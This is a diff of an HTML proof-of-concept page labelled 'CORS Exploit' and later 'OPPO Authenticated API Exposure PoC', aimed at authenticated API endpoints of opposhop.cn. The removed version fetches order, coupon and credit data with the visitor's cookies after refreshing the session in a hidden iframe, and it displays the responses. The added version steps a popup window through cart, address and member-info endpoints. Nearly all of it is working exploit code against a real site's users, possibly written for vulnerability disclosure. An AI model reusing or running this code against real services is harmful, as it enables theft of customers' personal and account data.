@@ -1,214 +1,58 @@
-<!DOCTYPE html>
 <html>
-<head>
-<meta charset="UTF-8">
-<title>CORS Exploit</title>
-
-<style>
-body {
-font-family: Arial;
-background: #0f172a;
-color: white;
-padding: 20px;
-}
-
-button {
-padding: 10px 20px;
-font-size: 16px;
-background: #22c55e;
-border: none;
-cursor: pointer;
-color: black;
-margin-bottom: 20px;
-}
-
-.container {
-display: grid;
-grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
-gap: 15px;
-}
-
-.card {
-padding: 15px;
-border-radius: 10px;
-background: #1e293b;
-}
-
-.success { border-left: 5px solid #22c55e; }
-.fail { border-left: 5px solid #ef4444; }
-
-.loading { opacity: 0.6; }
-
-pre {
-white-space: pre-wrap;
-word-break: break-word;
-font-size: 12px;
-}
-</style>
-
-</head>
 <body>
 
-<h2>CORS Exploit (Auto Mobile Context Refresh)</h2>
+<h2>OPPO Authenticated API Exposure PoC</h2>
 
-<button onclick="startAttack()">Run Exploit</button>
-
-<div id="results" class="container"></div>
-
+<button onclick="runExploit()">Run Exploit</button>
 
 <script>
 
 const endpoints = [
 
-"https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
+"https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list",
 
-"https://www.opposhop.cn/cn/oapi/orders/web/orders/info/myPage/userLists?orderType=[2,3,4]&currentPage=1&pageSize=5",
+"https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
 
 "https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1",
 
-"https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit"
+"https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit",
+
+"https://www.opposhop.cn/cn/oapi/credits/web/credits/show",
+
+"https://www.opposhop.cn/cn/oapi/users/web/address/list",
+
+"https://www.opposhop.cn/cn/oapi/users/web/member/info"
 
 ];
 
+let i = 0;
+let attackWindow = null;
 
+function runExploit() {
 
-function sleep(ms) {
+attackWindow = window.open("about:blank");
 
-return new Promise(resolve => setTimeout(resolve, ms));
-
-}
-
-
-
-async function refreshMobileContext() {
-
-return new Promise(resolve => {
-
-const iframe = document.createElement("iframe");
-
-iframe.style.display = "none";
-
-iframe.src = "https://www.opposhop.cn/cn/m/ucenter/index";
-
-document.body.appendChild(iframe);
-
-setTimeout(resolve, 3000);
-
-});
+nextStep();
 
 }
 
+function nextStep() {
 
+if(i >= endpoints.length){
 
-async function fetchWithRetry(url, retries = 3) {
+alert("Exploit finished");
 
-for (let i = 0; i < retries; i++) {
-
-try {
-
-const res = await fetch(url + "&t=" + Date.now(), {
-
-credentials: "include",
-
-cache: "no-store"
-
-});
-
-if (res.status === 200) {
-
-return res;
+return;
 
 }
 
-} catch(e) {}
+attackWindow.location = endpoints[i];
 
-await sleep(1200);
+console.log("Opening:", endpoints[i]);
 
-}
+i++;
 
-throw "Failed";
-
-}
-
-
-
-function createCard(url) {
-
-const div = document.createElement("div");
-
-div.className = "card loading";
-
-div.innerHTML = `
-<b>${url}</b><br>
-Status: <span class="status">Loading...</span>
-<pre></pre>
-`;
-
-document.getElementById("results").appendChild(div);
-
-return div;
-
-}
-
-
-
-async function fetchData(url) {
-
-const card = createCard(url);
-
-const statusEl = card.querySelector(".status");
-
-const pre = card.querySelector("pre");
-
-try {
-
-if (!url.includes("?")) {
-
-url += "?";
-
-}
-
-const res = await fetchWithRetry(url);
-
-const text = await res.text();
-
-card.classList.remove("loading");
-
-card.classList.add("success");
-
-statusEl.innerText = res.status;
-
-pre.innerText = text;
-
-} catch(e) {
-
-card.classList.remove("loading");
-
-card.classList.add("fail");
-
-statusEl.innerText = "Error";
-
-pre.innerText = e;
-
-}
-
-}
-
-
-
-async function startAttack() {
-
-document.getElementById("results").innerHTML = "";
-
-await refreshMobileContext();
-
-for (const endpoint of endpoints) {
-
-await fetchData(endpoint);
-
-await sleep(700);
-
-}
+setTimeout(nextStep, 3500);
 
 }
 
